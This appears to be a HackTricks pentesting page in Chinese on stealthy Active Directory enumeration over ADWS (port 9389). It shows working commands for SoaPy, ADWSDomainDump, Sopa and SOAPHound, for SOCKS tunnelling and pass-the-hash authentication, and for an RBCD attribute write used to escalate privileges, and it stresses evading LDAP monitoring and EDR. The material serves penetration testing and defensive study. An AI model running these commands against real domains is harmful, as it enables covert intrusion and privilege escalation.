# Active Directory Web Services (ADWS) 枚举与隐蔽收集

{{#include ../../banners/hacktricks-training.md}}

## 什么是 ADWS？

Active Directory Web Services (ADWS) **自 Windows Server 2008 R2 起默认在每个 Domain Controller 上启用**，并监听 TCP **9389**。尽管名称中有 Web，**但并不涉及 HTTP**。相反，该服务通过一组专有的 .NET framing protocols 暴露 LDAP 风格的数据：<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

由于流量封装在这些二进制 SOAP frames 中，并通过一个不常见的端口传输，**通过 ADWS 进行的枚举远比经典 LDAP/389 和 636 流量更不容易被检查、过滤或特征检测**。对 operator 来说，这意味着：<sup>[[1]](#references)[[7]](#references)</sup>

* 更隐蔽的 recon —— Blue team 通常会重点关注 LDAP 查询。
* 可以通过 SOCKS proxy 隧道传输 9389/TCP，从 **非 Windows 主机（Linux、macOS）** 收集数据。
* 可获取与通过 LDAP 相同的数据（users、groups、ACLs、schema 等），并且能够执行**写入**（例如，用于 **RBCD** 的 `msDs-AllowedToActOnBehalfOfOtherIdentity`）。

ADWS 交互通过 WS-Enumeration 实现：每个查询都以 `Enumerate` 消息开始，该消息定义 LDAP filter/attributes 并返回一个 `EnumerationContext` GUID；之后再通过一个或多个 `Pull` 消息传输数据，每次最多传输服务器定义的结果窗口大小。<sup>[[7]](#references)</sup> Context 大约 30 分钟后过期，因此工具要么需要分页获取结果，要么拆分 filter（按 CN 前缀分别查询），以免状态丢失。<sup>[[8]](#references)</sup> 请求 security descriptors 时，指定 `LDAP_SERVER_SD_FLAGS_OID` control 以省略 SACLs；否则 ADWS 会直接从 SOAP 响应中丢弃 `nTSecurityDescriptor` 属性。

> 注意：许多 RSAT GUI/PowerShell 工具也会使用 ADWS，因此相关流量可能与合法的管理员活动混在一起。

## SoaPy – 原生 Python 客户端

[SoaPy](https://github.com/logangoins/soapy) 是一个**使用纯 Python 完整重新实现 ADWS protocol stack 的项目**。它逐字节构造 NBFX/NBFSE/NNS/NMF frames，因此无需使用 .NET runtime，即可从类 Unix 系统收集数据。<sup>[[1]](#references)[[2]](#references)</sup>

### 主要功能

* 支持**通过 SOCKS proxy 转发**（适用于 C2 implants）。
* 支持与 LDAP `-q '(objectClass=user)'` 相同的精细搜索 filter。
* 可选的**写入**操作（ `--set` / `--delete` ）。
* **BOFHound 输出模式**，可直接导入 BloodHound。<sup>[[3]](#references)</sup>
* 需要便于人工阅读时，可使用 `--parse` flag 格式化 timestamps / `userAccountControl`。<sup>[[2]](#references)</sup>

### 定向收集 flags 与写入操作

SoaPy 提供了一组经过整理的 switches，可通过 ADWS 执行最常见的 LDAP hunting 任务：`--users`、`--computers`、`--groups`、`--spns`、`--asreproastable`、`--admins`、`--constrained`、`--unconstrained`、`--rbcds`，以及用于自定义 pulls 的原始 `--query` / `--filter` 参数。还可配合写入操作，例如 `--rbcd <source>`（设置 `msDs-AllowedToActOnBehalfOfOtherIdentity`）、`--spn <service/cn>`（为定向 Kerberoasting 暂存 SPN）和 `--asrep`（在 `userAccountControl` 中设置 `DONT_REQ_PREAUTH`）。<sup>[[2]](#references)</sup>

定向 SPN hunting 示例：仅返回 `samAccountName` 和 `servicePrincipalName`：

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

使用相同的主机/凭据，立即利用发现结果：使用 `--rbcds` 导出支持 RBCD 的对象，然后应用 `--rbcd 'WEBSRV01$' --account 'FILE01$'` 来构建基于资源的约束委派链（完整的滥用路径请参见 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)）。

### 安装（操作端主机）

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – 通过 ADWS 使用 LDAPDomainDump（Linux/Windows）

* `ldapdomaindump` 的 fork，将 LDAP 查询替换为通过 TCP/9389 发送的 ADWS 调用，以减少 LDAP-signature 命中。
* 除非传入 `--force`，否则会先检查 9389 端口是否可达（如果端口扫描容易产生噪声或被过滤，则跳过探测）。
* README 中称已针对 Microsoft Defender for Endpoint 和 CrowdStrike Falcon 测试，成功绕过检测。<sup>[[4]](#references)</sup>

### 安装

```bash
pipx install .
```

### 用法

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

典型输出会记录 9389 可达性检查、ADWS bind，以及 dump 的开始和结束：

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - 一个实用的 Golang ADWS 客户端

与 soapy 类似，[sopa](https://github.com/Macmod/sopa) 使用 Golang 实现了 ADWS 协议栈（MS-NNS + MC-NMF + SOAP），并提供命令行标志来发起 ADWS 调用，例如：<sup>[[5]](#references)</sup>

* **对象搜索与检索** - `query` / `get`
* **对象生命周期管理** - `create [user|computer|group|ou|container|custom]` 和 `delete`
* **属性编辑** - `attr [add|replace|delete]`
* **账户管理** - `set-password` / `change-password`
* 以及其他命令，例如 `groups`、`members`、`optfeature`、`info [version|domain|forest|dcs]` 等。

### 协议映射要点

* LDAP 风格的搜索通过 **WS-Enumeration**（`Enumerate` + `Pull`）发起，支持属性投影、范围控制（Base/OneLevel/Subtree）和分页。
* 单个对象的获取使用 **WS-Transfer** `Get`；属性修改使用 `Put`；删除使用 `Delete`。
* 内置对象创建使用 **WS-Transfer ResourceFactory**；自定义对象使用由 YAML 模板驱动的 **IMDA AddRequest**。
* 密码操作使用 **MS-ADCAP** 操作（`SetPassword`、`ChangePassword`）。<sup>[[5]](#references)</sup>

### 未经身份验证的元数据发现（mex）

ADWS 无需凭据即可提供 WS-MetadataExchange，这是在身份验证前快速验证服务是否暴露的方法：<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### DNS/DC 发现与 Kerberos targeting 注意事项

如果省略 `--dc` 并提供 `--domain`，Sopa 可以通过 SRV 解析 DC。它会按以下顺序查询，并使用优先级最高的目标：<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

在实际操作中，优先使用由 DC 控制的 resolver，以避免在网络分段环境中发生故障：

* 使用 `--dns <DC-IP>`，确保所有 SRV/PTR/正向查询都通过 DC DNS 进行。
* UDP 被阻止或 SRV 响应较大时，使用 `--dns-tcp`。
* 如果启用了 Kerberos，且 `--dc` 是 IP，sopa 会执行**反向 PTR**查询以获取 FQDN，从而正确定位 SPN/KDC。如果未使用 Kerberos，则不会进行 PTR 查询。

示例（IP + Kerberos，通过 DC 强制进行 DNS 查询）：

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Auth material options

除了明文密码，sopa 还支持用于 ADWS 认证的 **NT hashes**、**Kerberos AES keys**、**ccache** 和 **PKINIT certificates**（PFX 或 PEM）。使用 `--aes-key`、`-c`（ccache）或基于证书的选项时，会默认使用 Kerberos。<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### 通过模板创建自定义对象

对于任意对象类，`create custom` 命令会使用映射到 IMDA `AddRequest` 的 YAML 模板：<sup>[[5]](#references)</sup>

* `parentDN` 和 `rdn` 定义容器和相对 DN。
* `attributes[].name` 支持 `cn` 或带命名空间的 `addata:cn`。
* `attributes[].type` 接受 `string|int|bool|base64|hex` 或显式的 `xsd:*`。
* **不要**包含 `ad:relativeDistinguishedName` 或 `ad:container-hierarchy-parent`；sopa 会注入它们。
* `hex` 值会转换为 `xsd:base64Binary`；使用 `value: ""` 设置空字符串。

## SOAPHound – 高容量 ADWS 收集（Windows）

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) 是一个 .NET 收集器，所有 LDAP 交互都通过 ADWS 进行，并输出兼容 BloodHound v4 的 JSON。它会先完整缓存一次 `objectSid`、`objectGUID`、`distinguishedName` 和 `objectClass`（`--buildcache`），然后在高容量的 `--bhdump`、`--certdump`（ADCS）或 `--dnsdump`（AD 集成 DNS）过程中重复使用该缓存，因此离开 DC 的关键属性仅约有 35 个。在大型森林中，AutoSplit（`--autosplit --threshold <N>`）会按 CN 前缀自动拆分查询，以确保不超过 30 分钟的 EnumerationContext 超时时限。<sup>[[8]](#references)</sup>

域加入的操作员 VM 上的典型工作流：

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

导出的 JSON 可直接接入 SharpHound/BloodHound 工作流——下游图谱分析思路请参见 [BloodHound methodology](bloodhound.md)。AutoSplit 让 SOAPHound 能够稳定处理包含数百万对象的林，同时保持较低的查询次数，优于 ADExplorer 风格的快照。

## Stealth AD Collection Workflow

以下工作流展示了如何通过 ADWS 枚举 **domain 和 ADCS 对象**，将其转换为 BloodHound JSON，并搜寻基于证书的攻击路径——全程在 Linux 上完成：

1. **将 9389/TCP** 从目标网络隧道转发到你的主机（例如通过 Chisel、Meterpreter、SSH dynamic port-forward 等）。导出 `export HTTPS_PROXY=socks5://127.0.0.1:1080`，或使用 SoaPy 的 `--proxyHost/--proxyPort`。

2. **收集根域对象：**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **从 Configuration NC 收集与 ADCS 相关的对象：**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **转换为 BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **将 ZIP 上传**到 BloodHound GUI，并运行 cypher 查询，例如 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`，以发现证书提权路径（ESC1、ESC8 等）。

### 写入 `msDs-AllowedToActOnBehalfOfOtherIdentity`（RBCD）

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

将其与 `s4u2proxy`/`Rubeus /getticket` 结合，构成完整的 **Resource-Based Constrained Delegation** 链（参见 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)）。

## 工具概览

| 用途 | 工具 | 备注 |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python、SOCKS、读写 |
| 大规模 ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET、优先使用缓存，支持 BH/ADCS/DNS 模式 |
| BloodHound 数据导入 | [BOFHound](https://github.com/bohops/BOFHound) | 转换 SoaPy/ldapsearch 日志 |
| 证书攻陷 | [Certipy](https://github.com/ly4k/Certipy) | 可通过相同的 SOCKS 代理 |
| ADWS enumeration 与对象更改 | [sopa](https://github.com/Macmod/sopa) | 用于与已知 ADWS 端点交互的通用客户端，可进行 enumeration、创建对象、修改属性和更改密码 |

## References

- [1] [SpecterOps – 确保使用 SOAP(y)——使用 ADWS 隐蔽收集 AD 数据的操作指南](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX、MC-NBFSE、MS-NNS、MC-NMF 规范](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – 通过 ADWS 隐蔽枚举 Active Directory 环境](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – 通过 ADWS 收集 Active Directory 数据的 SOAPHound 工具](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
